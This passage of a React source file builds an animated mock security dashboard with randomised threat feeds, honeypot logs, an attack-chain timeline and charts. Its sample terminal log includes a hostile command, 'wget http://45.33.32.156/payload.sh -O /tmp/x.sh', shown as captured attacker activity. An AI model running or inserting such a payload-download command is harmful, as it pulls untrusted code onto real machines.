import React, {
  useEffect,
  useLayoutEffect,
  useMemo,
  useRef,
  useState,
} from 'react';
import {
  Shield,
  Zap,
  ShieldCheck,
  Search,
  Terminal,
  Server,
  Package,
  Activity,
  AlertTriangle,
  CheckCircle2,
  Radio,
  Cpu,
  Clock,
  Wifi,
  Database,
  Lock,
  Eye,
  Network,
  MessageSquare,
  BookOpen,
} from 'lucide-react';
import { SectionHeader } from './SectionHeader';
import { motion, AnimatePresence } from 'motion/react';



/* ============================================================
   Design tokens — light & dark mode supportive with Cyan accents
   ============================================================ */

const TONE: Record<
  string,
  { text: string; chipBg: string; chipBorder: string; bar: string; dot: string }
> = {
  cyan: {
    text: 'text-cyan-600 dark:text-cyan-400',
    chipBg: 'bg-cyan-500/10 dark:bg-cyan-400/10',
    chipBorder: 'border-cyan-500/30 dark:border-cyan-400/30',
    bar: 'bg-cyan-500 dark:bg-cyan-400',
    dot: 'bg-cyan-500 dark:bg-cyan-400',
  },
  green: {
    text: 'text-emerald-600 dark:text-emerald-400',
    chipBg: 'bg-emerald-500/10 dark:bg-emerald-400/10',
    chipBorder: 'border-emerald-500/30 dark:border-emerald-400/30',
    bar: 'bg-emerald-500 dark:bg-emerald-400',
    dot: 'bg-emerald-500 dark:bg-emerald-400',
  },
  amber: {
    text: 'text-amber-600 dark:text-amber-400',
    chipBg: 'bg-amber-500/10 dark:bg-amber-400/10',
    chipBorder: 'border-amber-500/30 dark:border-amber-400/30',
    bar: 'bg-amber-500 dark:bg-amber-400',
    dot: 'bg-amber-500 dark:bg-amber-400',
  },
  red: {
    text: 'text-rose-600 dark:text-rose-400',
    chipBg: 'bg-rose-500/10 dark:bg-rose-400/10',
    chipBorder: 'border-rose-500/30 dark:border-rose-400/30',
    bar: 'bg-rose-500 dark:bg-rose-400',
    dot: 'bg-rose-500 dark:bg-rose-400',
  },
  blue: {
    text: 'text-blue-600 dark:text-blue-400',
    chipBg: 'bg-blue-500/10 dark:bg-blue-400/10',
    chipBorder: 'border-blue-500/30 dark:border-blue-400/30',
    bar: 'bg-blue-500 dark:bg-blue-400',
    dot: 'bg-blue-500 dark:bg-blue-400',
  },
};

/* ============================================================
   Helpers
   ============================================================ */

const clamp = (n: number, min: number, max: number) => Math.min(max, Math.max(min, n));
const randInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = <T,>(arr: T[]): T => arr[randInt(0, arr.length - 1)];
let idCounter = 0;
const nextId = () => `evt-${Date.now()}-${idCounter++}`;

function formatAgo(ms: number) {
  const s = Math.floor(ms / 1000);
  if (s < 2) return 'JUST NOW';
  if (s < 60) return `${s}s AGO`;
  return `${Math.floor(s / 60)}m AGO`;
}

function severityTone(sev: string) {
  if (sev === 'CRITICAL' || sev === 'HIGH') return 'red';
  if (sev === 'MEDIUM') return 'amber';
  return 'cyan';
}

/* ============================================================
   Hooks
   ============================================================ */

function useVisible<T extends HTMLElement>() {
  const ref = useRef<T | null>(null);
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const io = new IntersectionObserver(([entry]) => setVisible(entry.isIntersecting), {
      threshold: 0.15,
    });
    io.observe(el);
    return () => io.disconnect();
  }, []);
  return [ref, visible] as const;
}

function useLiveNumber(
  base: number,
  opts: { min: number; max: number; step?: number; intervalMs?: number; active?: boolean }
) {
  const { min, max, step = 1, intervalMs = 2200, active = true } = opts;
  const [value, setValue] = useState(base);
  useEffect(() => {
    if (!active) return;
    const id = setInterval(() => {
      setValue((v) => clamp(v + randInt(-step, step), min, max));
    }, intervalMs);
    return () => clearInterval(id);
  }, [active, min, max, step, intervalMs]);
  return value;
}

function useTick(active: boolean, intervalMs = 1000) {
  const [, setTick] = useState(0);
  useEffect(() => {
    if (!active) return;
    const id = setInterval(() => setTick((t) => t + 1), intervalMs);
    return () => clearInterval(id);
  }, [active, intervalMs]);
}

function useSparkData(len: number, base: number, active: boolean) {
  const [data, setData] = useState<number[]>(() =>
    Array.from({ length: len }, () => clamp(base + randInt(-10, 10), 5, 95))
  );
  useEffect(() => {
    if (!active) return;
    const id = setInterval(() => {
      setData((prev) => [...prev.slice(1), clamp(prev[prev.length - 1] + randInt(-8, 8), 5, 95)]);
    }, 900);
    return () => clearInterval(id);
  }, [active]);
  return data;
}

/* ============================================================
   Event pools — the content each "live feed" samples from
   ============================================================ */

const SOC_POOL = [
  { message: 'SSH brute-force burst blocked from 185.220.101.5', severity: 'CRITICAL', status: 'Auto-Mitigated' },
  { message: 'Credential stuffing sweep detected · 74 req/sec', severity: 'HIGH', status: 'Blocked' },
  { message: 'SQL injection pattern probe from 45.33.32.156', severity: 'MEDIUM', status: 'Investigating' },
  { message: 'Port scan across 12 hosts from 91.240.118.19', severity: 'MEDIUM', status: 'Auto-Mitigated' },
  { message: 'Anomalous outbound traffic from db-server', severity: 'HIGH', status: 'Investigating' },
  { message: 'Cowrie honeypot captured a new session', severity: 'MEDIUM', status: 'Logged' },
];

const POSTURE_POOL = [
  { message: 'CVE-2024-3094 detected in liblzma (xz-utils)', severity: 'CRITICAL', status: 'Patch Available' },
  { message: 'CVE-2023-4863 found in libwebp dependency', severity: 'HIGH', status: 'Under Review' },
  { message: 'Exposed Postgres port on db-server', severity: 'HIGH', status: 'Remediated' },
  { message: 'Outdated TLS config on edge-cache-04', severity: 'MEDIUM', status: 'Scheduled' },
  { message: 'IAM role with excessive S3 permissions', severity: 'MEDIUM', status: 'Under Review' },
];

const ASSETS_POOL = [
  { message: 'Unexpected outbound connection from nginx-ingress-7f9', severity: 'HIGH', status: 'Flagged' },
  { message: 'New capability CAP_SYS_ADMIN added to api-core-5c1', severity: 'HIGH', status: 'Investigating' },
  { message: 'Image drift detected in redis-cache-1', severity: 'MEDIUM', status: 'Auto-Remediated' },
  { message: 'Privileged container started in default namespace', severity: 'CRITICAL', status: 'Blocked' },
  { message: 'Base image outdated for postgres-primary', severity: 'LOW', status: 'Scheduled' },
];

function makeEvent(pool: typeof SOC_POOL) {
  return { id: nextId(), createdAt: Date.now(), ...pick(pool) };
}

/* ============================================================
   Shared UI atoms (Light & Dark theme responsive)
   ============================================================ */

function StatCard({
  icon: Icon,
  label,
  value,
  tone = 'cyan',
  suffix = '',
}: {
  icon: any;
  label: string;
  value: number | string;
  tone?: string;
  suffix?: string;
}) {
  const t = TONE[tone] || TONE.cyan;
  return (
    <div className=" border border-slate-200/80 dark:border-[#1a222d] bg-slate-100/80 dark:bg-[#0d1117] p-4 flex flex-col gap-2 transition-colors duration-300">
      <div className="flex items-center justify-between">
        <span className="text-[10px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase">
          {label}
        </span>
        <div className={`p-1.5  ${t.chipBg} ${t.text}`}>
          <Icon className="w-3.5 h-3.5" />
        </div>
      </div>
      <span className={`text-2xl font-bold font-mono ${t.text} tabular-nums`}>
        {value}
        {suffix}
      </span>
    </div>
  );
}

function Sparkline({ data, color = '#06b6d4', height = 46 }: { data: number[]; color?: string; height?: number }) {
  const width = 200;
  const points = useMemo(() => {
    const max = Math.max(...data, 1);
    const min = Math.min(...data, 0);
    const range = max - min || 1;
    return data
      .map((v, i) => {
        const x = (i / (data.length - 1)) * width;
        const y = height - ((v - min) / range) * height;
        return `${x},${y}`;
      })
      .join(' ');
  }, [data, height]);
  return (
    <svg viewBox={`0 0 ${width} ${height}`} className="w-full h-full overflow-visible">
      <polyline
        points={points}
        fill="none"
        stroke={color}
        strokeWidth="1.6"
        strokeLinejoin="round"
        strokeLinecap="round"
        opacity="0.9"
      />
    </svg>
  );
}

function BarGroup({
  title,
  items,
  active,
}: {
  title: string;
  items: { label: string; value: number; tone: string }[];
  active: boolean;
}) {
  const [mounted, setMounted] = useState(false);
  useEffect(() => {
    const t = setTimeout(() => setMounted(true), 60);
    return () => clearTimeout(t);
  }, [active]);
  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 transition-colors duration-300">
      <h4 className="text-[11px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase mb-3">{title}</h4>
      <div className="space-y-3">
        {items.map((it) => {
          const t = TONE[it.tone] || TONE.cyan;
          return (
            <div key={it.label}>
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs text-slate-700 dark:text-[#c3cad6] font-mono">{it.label}</span>
                <span className={`text-xs font-mono font-semibold ${t.text}`}>{it.value}%</span>
              </div>
              <div className="h-1.5 rounded-full bg-slate-200 dark:bg-[#161c26] overflow-hidden">
                <div
                  className={`h-full rounded-full ${t.bar} transition-all duration-1000 ease-out`}
                  style={{ width: mounted && active ? `${it.value}%` : '0%' }}
                />
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function EventFeed({
  pool,
  active,
  max = 6,
  height = 'h-[380px]',
  className=""


}: {
  pool: typeof SOC_POOL;
  active: boolean;
  max?: number;
  height?: string;
  className?: string;
}) {
  const [events, setEvents] = useState(() => Array.from({ length: 3 }, () => makeEvent(pool)));
  useTick(active, 1000);

  useEffect(() => {
    if (!active) return;
    let cancelled = false;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      timeoutId = setTimeout(() => {
        if (cancelled) return;
        setEvents((prev) => [makeEvent(pool), ...prev].slice(0, max));
        schedule();
      }, randInt(1800, 3200));
    };
    schedule();
    return () => {
      cancelled = true;
      clearTimeout(timeoutId);
    };
  }, [active, pool, max]);

  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] overflow-hidden transition-colors duration-300">
      <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-200/80 dark:border-[#1a2029]">
        <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 dark:bg-cyan-400 animate-pulse" />
        <span className="text-[10px] font-mono tracking-[0.16em] text-cyan-600 dark:text-cyan-400 uppercase font-semibold">Live</span>
        <span className="text-[10px] font-mono text-slate-500 dark:text-[#4d5766] ml-auto">event stream</span>
      </div>
      <div className={`${height} overflow-hidden divide-y divide-slate-200/80 dark:divide-[#161c26]`}>
        {events.map((e) => {
          const t = TONE[severityTone(e.severity)] || TONE.cyan;
          return (
            <div key={e.id} className="tic-arrive px-4 py-2.5 flex items-start gap-3">
              <span className={`mt-1 w-1.5 h-1.5 rounded-full flex-shrink-0 ${t.dot}`} />
              <div className="min-w-0 flex-1">
                <p className="text-xs text-slate-800 dark:text-[#c3cad6] leading-snug truncate">{e.message}</p>
                <div className="flex items-center gap-2 mt-1">
                  <span
                    className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${t.chipBg} ${t.text} border ${t.chipBorder}`}
                  >
                    {e.severity}
                  </span>
                  <span className="text-[9px] font-mono text-slate-500 dark:text-[#4d5766]">{e.status}</span>
                  <span className="text-[9px] font-mono text-slate-500 dark:text-[#4d5766] ml-auto flex-shrink-0">
                    {formatAgo(Date.now() - e.createdAt)}
                  </span>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ============================================================
   Tab-specific panels
   ============================================================ */

function AgentList({ active }: { active: boolean }) {
  const agents = [
    { name: 'agent-ny-04', host: '10.20.1.14', region: 'us-east' },
    { name: 'agent-fra-11', host: '10.30.4.02', region: 'eu-central' },
    { name: 'agent-sgp-02', host: '10.40.2.19', region: 'ap-southeast' },
    { name: 'agent-syd-07', host: '10.50.1.33', region: 'ap-southeast-2' },
    { name: 'agent-ny-09', host: '10.20.1.41', region: 'us-east' },
  ];
  useTick(active, 1000);
  const [lastSeen] = useState(() => agents.map(() => Date.now() - randInt(0, 4000)));
  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] divide-y divide-slate-200/80 dark:divide-[#161c26] overflow-hidden transition-colors duration-300">
      {agents.map((a, i) => (
        <div key={a.name} className="px-4 py-2.5 flex items-center gap-3">
          <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 dark:bg-cyan-400 animate-pulse" />
          <div className="min-w-0 flex-1">
            <span className="text-xs font-mono text-slate-800 dark:text-[#c3cad6] block truncate">{a.name}</span>
            <span className="text-[10px] font-mono text-slate-500 dark:text-[#4d5766] block">
              {a.host} · {a.region}
            </span>
          </div>
          <span className="text-[9px] font-mono text-slate-500 dark:text-[#4d5766] flex-shrink-0">
            {formatAgo(Date.now() - lastSeen[i])}
          </span>
        </div>
      ))}
    </div>
  );
}

function ProbeList() {
  const probes = [
    { name: 'SSH Honeypot', count: 3 },
    { name: 'DB Honeypot', count: 2 },
    { name: 'Web Honeypot', count: 1 },
  ];
  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 space-y-2.5 transition-colors duration-300">
      <h4 className="text-[11px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase mb-1">Active Probes</h4>
      {probes.map((p) => (
        <div key={p.name} className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 dark:bg-cyan-400 animate-pulse" />
            <span className="text-xs font-mono text-slate-800 dark:text-[#c3cad6]">{p.name}</span>
          </div>
          <span className="text-xs font-mono text-slate-500 dark:text-[#6b7686]">×{p.count}</span>
        </div>
      ))}
    </div>
  );
}

function InvestigationTimeline({ active }: { active: boolean }) {
  const steps = [
    { title: 'Initial Access', detail: 'SSH brute-force burst from 185.220.101.5 (TOR exit node)', tone: 'red' },
    { title: 'Credential Access', detail: 'Cowrie honeypot captured 3 credential pairs', tone: 'amber' },
    { title: 'Lateral Movement', detail: 'Attempted pivot toward db-server:2223', tone: 'amber' },
    { title: 'Containment', detail: 'Source IP auto-blocked, IPTables synced', tone: 'cyan' },
  ];
  const [visible, setVisible] = useState(1);
  useEffect(() => {
    if (!active) return;
    setVisible(1);
    let count = 1;
    const delays = [1400, 1800, 1600];
    let timeoutId: ReturnType<typeof setTimeout>;
    const next = () => {
      if (count >= steps.length) return;
      timeoutId = setTimeout(() => {
        count += 1;
        setVisible(count);
        next();
      }, delays[count - 1]);
    };
    next();
    return () => clearTimeout(timeoutId);
  }, [active]);

  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 transition-colors duration-300">
      <h4 className="text-[11px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase mb-4">Attack Chain</h4>
      <div>
        {steps.map((s, i) => {
          if (i + 1 > visible) return null;
          const t = TONE[s.tone] || TONE.cyan;
          const isLast = i === steps.length - 1;
          return (
            <div key={s.title} className="tic-arrive flex gap-3">
              <div className="flex flex-col items-center">
                <span className={`w-2.5 h-2.5 rounded-full ${t.dot} ring-4 ${t.chipBg}`} />
                {!isLast && <span className="w-px flex-1 bg-slate-200 dark:bg-[#212832] my-1" />}
              </div>
              <div className="pb-5 min-w-0">
                <p className={`text-xs font-semibold font-mono ${t.text}`}>{s.title}</p>
                <p className="text-xs text-slate-600 dark:text-[#8a93a3] mt-0.5">{s.detail}</p>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function IOCList() {
  const iocs = [
    { label: 'IP', value: '185.220.101.5' },
    { label: 'ASN', value: 'AS208843 (TOR)' },
    { label: 'SHA256', value: '9f2a…c31e' },
    { label: 'Target', value: 'db-server:2223' },
  ];
  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 space-y-2.5 transition-colors duration-300">
      <h4 className="text-[11px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase mb-1">Related Indicators</h4>
      {iocs.map((x) => (
        <div key={x.label} className="flex items-center justify-between text-xs font-mono">
          <span className="text-slate-500 dark:text-[#6b7686]">{x.label}</span>
          <span className="text-slate-800 dark:text-[#c3cad6] font-semibold">{x.value}</span>
        </div>
      ))}
    </div>
  );
}

function TerminalLog({ active }: { active: boolean }) {
  const sources = [
    { tag: 'auth.log', color: 'text-cyan-600 dark:text-cyan-400' },
    { tag: 'cowrie.json', color: 'text-amber-600 dark:text-amber-400' },
    { tag: 'syslog', color: 'text-blue-600 dark:text-blue-400' },
  ];
  const messages = [
    'Failed password for invalid user admin from 185.220.101.5 port 51422',
    'session opened for user root by (uid=0)',
    'CMD: wget http://45.33.32.156/payload.sh -O /tmp/x.sh',
    'Connection closed by 91.240.118.19 port 22334',
    'New session: 8f3a2c1e from 45.33.32.156',
    'Accepted password for postgres from 10.0.3.14 port 5432',
  ];
  const makeLine = () => {
    const src = pick(sources);
    const now = new Date();
    const time = [now.getHours(), now.getMinutes(), now.getSeconds()]
      .map((n) => String(n).padStart(2, '0'))
      .join(':');
    return { id: nextId(), time, tag: src.tag, color: src.color, message: pick(messages) };
  };
  const [lines, setLines] = useState(() => Array.from({ length: 6 }, makeLine));
  useEffect(() => {
    if (!active) return;
    const id = setInterval(() => {
      setLines((prev) => [...prev.slice(-40), makeLine()]);
    }, 1100);
    return () => clearInterval(id);
  }, [active]);

  return (
    <div className=" border border-slate-300 dark:border-[#212832] bg-slate-950 dark:bg-[#0a0d12] overflow-hidden transition-colors duration-300">
      <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-800 dark:border-[#1a2029] flex-wrap bg-slate-900/90 dark:bg-[#10141b]">
        {sources.map((s) => (
          <span
            key={s.tag}
            className={`text-[9px] font-mono font-semibold px-2 py-0.5 rounded border border-slate-700/60 dark:border-[#212832] bg-slate-950 dark:bg-[#0a0d12] ${s.color}`}
          >
            {s.tag}
          </span>
        ))}
        <span className="ml-auto text-[9px] font-mono text-slate-400 dark:text-[#4d5766]">tail -f</span>
      </div>
      <div className="h-[260px] overflow-hidden px-4 py-3 font-mono text-[11.5px] leading-relaxed">
        {lines.slice(-16).map((l) => (
          <div key={l.id} className="tic-arrive whitespace-pre truncate">
            <span className="text-slate-500 dark:text-[#4d5766]">{l.time}</span> <span className={l.color}>[{l.tag}]</span>{' '}
            <span className="text-slate-200 dark:text-[#c3cad6]">{l.message}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

function HostList({ active }: { active: boolean }) {
  const hosts = [
    { name: 'web-prod-01', os: 'Ubuntu 22.04', region: 'us-east', status: 'cyan' },
    { name: 'db-prod-02', os: 'Debian 12', region: 'eu-central', status: 'cyan' },
    { name: 'cache-edge-04', os: 'Alpine', region: 'ap-southeast', status: 'amber' },
    { name: 'win-legacy-01', os: 'Windows Server', region: 'us-west', status: 'cyan' },
    { name: 'honeypot-dev-01', os: 'Ubuntu 22.04', region: 'us-east', status: 'cyan' },
  ];
  useTick(active, 1000);
  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] divide-y divide-slate-200/80 dark:divide-[#161c26] overflow-hidden transition-colors duration-300">
      {hosts.map((h) => {
        const t = TONE[h.status] || TONE.cyan;
        return (
          <div key={h.name} className="px-4 py-2.5 flex items-center gap-3">
            <span className={`w-1.5 h-1.5 rounded-full ${t.dot} animate-pulse`} />
            <div className="min-w-0 flex-1">
              <span className="text-xs font-mono text-slate-800 dark:text-[#c3cad6] block truncate">{h.name}</span>
              <span className="text-[10px] font-mono text-slate-500 dark:text-[#4d5766] block">
                {h.os} · {h.region}
              </span>
            </div>
          </div>
        );
      })}
    </div>
  );
}

function ContainerGrid() {
  const pods = [
    { name: 'nginx-ingress-7f9', ns: 'ingress', status: 'Running' },
    { name: 'cowrie-honeypot-2', ns: 'lureguard', status: 'Running' },
    { name: 'wazuh-manager-0', ns: 'security', status: 'Running' },
    { name: 'api-core-5c1', ns: 'default', status: 'Drift' },
    { name: 'postgres-primary', ns: 'data', status: 'Running' },
    { name: 'redis-cache-1', ns: 'default', status: 'Restarting' },
  ];
  const statusTone: Record<string, string> = { Running: 'cyan', Drift: 'amber', Restarting: 'red' };
  return (
    <div className="grid grid-cols-2 gap-2.5">
      {pods.map((p) => {
        const t = TONE[statusTone[p.status]] || TONE.cyan;
        return (
          <div key={p.name} className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-3 transition-colors duration-300">
            <div className="flex items-center justify-between mb-1.5">
              <span className={`w-1.5 h-1.5 rounded-full ${t.dot}`} />
              <span className={`text-[9px] font-mono font-semibold ${t.text}`}>{p.status}</span>
            </div>
            <span className="text-[11px] font-mono text-slate-800 dark:text-[#c3cad6] block truncate font-semibold">{p.name}</span>
            <span className="text-[9px] font-mono text-slate-500 dark:text-[#4d5766]">{p.ns}</span>
          </div>
        );
      })}
    </div>
  );
}

function NetworkThroughputChart({ active }: { active: boolean }) {
  const pointCount = 38;
  const [dataPoints, setDataPoints] = useState<number[]>(() => {
    const base: number[] = [];
    for (let i = 0; i < pointCount; i++) {
      if (i === 10 || i === 31) {
        base.push(26 + Math.random() * 8);
      } else if (i === 6) {
        base.push(114 + Math.random() * 4);
      } else {
        base.push(92 + Math.sin(i * 0.45) * 6 + (Math.random() * 6 - 3));
      }
    }
    return base;
  });

  const [secPink] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 6 + Math.sin(i * 0.8) * 3 + Math.random() * 2)
  );
  const [secYellow] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 3 + Math.cos(i * 0.6) * 3 + Math.random() * 2)
  );
  const [secTeal] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 1.5 + Math.sin(i * 1.1) * 2 + Math.random() * 1.5)
  );

  const [timeLabels, setTimeLabels] = useState<string[]>(() => {
    const times: string[] = [];
    const now = new Date();
    for (let i = 5; i >= 0; i--) {
      const d = new Date(now.getTime() - i * 2 * 60 * 1000);
      times.push(d.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' }));
    }
    return times;
  });

  useEffect(() => {
    if (!active) return;
    const interval = setInterval(() => {
      setDataPoints((prev) => {
        const last = prev[prev.length - 1];
        let nextVal = last + (Math.random() * 10 - 5);

        const rand = Math.random();
        if (rand < 0.08) nextVal = 28 + Math.random() * 8;
        else if (rand < 0.16) nextVal = 112 + Math.random() * 6;
        else nextVal = clamp(nextVal, 82, 106);

        return [...prev.slice(1), nextVal];
      });

      const now = new Date();
      const times: string[] = [];
      for (let i = 5; i >= 0; i--) {
        const d = new Date(now.getTime() - i * 2 * 60 * 1000);
        times.push(d.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' }));
      }
      setTimeLabels(times);
    }, 1200);

    return () => clearInterval(interval);
  }, [active]);

  const maxVal = 120;
  const svgWidth = 600;
  const svgHeight = 160;

  const pointsString = useMemo(() => {
    return dataPoints
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [dataPoints]);

  const areaPath = useMemo(() => {
    if (!pointsString) return '';
    return `M 0,${svgHeight} L ${pointsString} L ${svgWidth},${svgHeight} Z`;
  }, [pointsString]);

  const secPinkPoints = useMemo(() => {
    return secPink
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secPink]);

  const secYellowPoints = useMemo(() => {
    return secYellow
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secYellow]);

  const secTealPoints = useMemo(() => {
    return secTeal
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secTeal]);

  const currentRate = dataPoints[dataPoints.length - 1]?.toFixed(2) || '95.37';

  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 sm:p-5 transition-colors duration-300">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2">
          <Network className="w-4 h-4 text-cyan-600 dark:text-cyan-400" />
          <h4 className="text-xs sm:text-sm font-mono font-bold text-slate-800 dark:text-slate-200 tracking-wide">
            Network throughput
          </h4>
        </div>
        <div className="flex items-center gap-2.5 text-xs font-mono">
          <span className="text-slate-500 dark:text-[#6b7686]">Current:</span>
          <span className="text-cyan-600 dark:text-cyan-400 font-bold tabular-nums">
            {currentRate} MiB/s
          </span>
        </div>
      </div>

      <div className="relative flex items-stretch">
        <div className="flex flex-col justify-between text-[10px] sm:text-[11px] font-mono text-slate-500 dark:text-[#5a6578] pr-3 select-none shrink-0 h-28 text-right">
          <span>119.21 MiB</span>
          <span>79.47 MiB</span>
          <span>39.73 MiB</span>
          <span>0 B</span>
        </div>

        <div className="relative flex-1 h-28 overflow-hidden rounded-sm">
          <div className="absolute inset-0 flex flex-col justify-between pointer-events-none z-0">
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
          </div>

          <svg
            viewBox={`0 0 ${svgWidth} ${svgHeight}`}
            className="w-full h-full overflow-visible relative z-10"
            preserveAspectRatio="none"
          >
            <defs>
              <linearGradient id="networkFillGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#0284c7" stopOpacity="0.28" />
                <stop offset="100%" stopColor="#0284c7" stopOpacity="0.02" />
              </linearGradient>
            </defs>

            <path d={areaPath} fill="url(#networkFillGrad)" />

            <polyline points={secPinkPoints} fill="none" stroke="#ec4899" strokeWidth="1.2" strokeOpacity="0.75" />
            <polyline points={secYellowPoints} fill="none" stroke="#eab308" strokeWidth="1.2" strokeOpacity="0.8" />
            <polyline points={secTealPoints} fill="none" stroke="#14b8a6" strokeWidth="1.2" strokeOpacity="0.75" />

            <polyline
              points={pointsString}
              fill="none"
              stroke="#0284c7"
              strokeWidth="2.2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="transition-all duration-300"
            />
          </svg>
        </div>
      </div>

      <div className="flex justify-between pl-16 pt-2 text-[10px] sm:text-[11px] font-mono text-slate-500 dark:text-[#5a6578] select-none">
        {timeLabels.map((time, idx) => (
          <span key={idx}>{time}</span>
        ))}
      </div>
    </div>
  );
}

/* ---- Panels: one per tab, all pausing simulations via `active` ---- */

function SocPanel({ active }: { active: boolean }) {
  const blocked = useLiveNumber(1842, { min: 1800, max: 1900, step: 3, active });
  const eventsPerSec = useLiveNumber(312, { min: 260, max: 380, step: 12, active, intervalMs: 1400 });
  const assets = useLiveNumber(486, { min: 480, max: 492, step: 1, active, intervalMs: 3000 });
  const incidents = useLiveNumber(3, { min: 1, max: 6, step: 1, active, intervalMs: 4000 });

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Shield} label="Attacks Blocked" value={blocked} tone="cyan" />
        <StatCard icon={Activity} label="Events / sec" value={eventsPerSec} tone="blue" />
        <StatCard icon={Lock} label="Assets Protected" value={assets} tone="amber" />
        <StatCard icon={AlertTriangle} label="Active Incidents" value={incidents} tone="red" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <EventFeed pool={SOC_POOL} active={active} max={12} className="h-full flex-1" />
        <div className="space-y-4 ">
          <BarGroup
            title="Weekly Threat Distribution"
            active={active}
            items={[
              { label: 'Brute-force', value: 68, tone: 'red' },
              { label: 'Credential Stuffing', value: 55, tone: 'amber' },
              { label: 'SQL Injection', value: 41, tone: 'amber' },
              { label: 'Recon / Scanning', value: 33, tone: 'cyan' },
              { label: 'Malware Drop', value: 22, tone: 'red' },
            ]}
          />
          <NetworkThroughputChart active={active} />
        </div>
      </div>
    </div>
  );
}

function FleetCpuLoadChart({ active }: { active: boolean }) {
  const pointCount = 38;
  const [dataPoints, setDataPoints] = useState<number[]>(() => {
    const base: number[] = [];
    for (let i = 0; i < pointCount; i++) {
      if (i === 14 || i === 28) {
        base.push(72 + Math.random() * 12);
      } else if (i === 8) {
        base.push(14 + Math.random() * 5);
      } else {
        base.push(32 + Math.sin(i * 0.5) * 8 + (Math.random() * 6 - 3));
      }
    }
    return base;
  });

  const [secCyan] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 12 + Math.sin(i * 0.7) * 4 + Math.random() * 3)
  );
  const [secRose] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 8 + Math.cos(i * 0.5) * 3 + Math.random() * 2)
  );
  const [secEmerald] = useState<number[]>(() =>
    Array.from({ length: pointCount }, (_, i) => 5 + Math.sin(i * 0.9) * 2 + Math.random() * 2)
  );

  const [timeLabels, setTimeLabels] = useState<string[]>(() => {
    const times: string[] = [];
    const now = new Date();
    for (let i = 5; i >= 0; i--) {
      const d = new Date(now.getTime() - i * 2 * 60 * 1000);
      times.push(d.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' }));
    }
    return times;
  });

  useEffect(() => {
    if (!active) return;
    const interval = setInterval(() => {
      setDataPoints((prev) => {
        const last = prev[prev.length - 1];
        let nextVal = last + (Math.random() * 10 - 5);

        const rand = Math.random();
        if (rand < 0.1) nextVal = 68 + Math.random() * 14;
        else if (rand < 0.18) nextVal = 16 + Math.random() * 6;
        else nextVal = clamp(nextVal, 22, 54);

        return [...prev.slice(1), nextVal];
      });

      const now = new Date();
      const times: string[] = [];
      for (let i = 5; i >= 0; i--) {
        const d = new Date(now.getTime() - i * 2 * 60 * 1000);
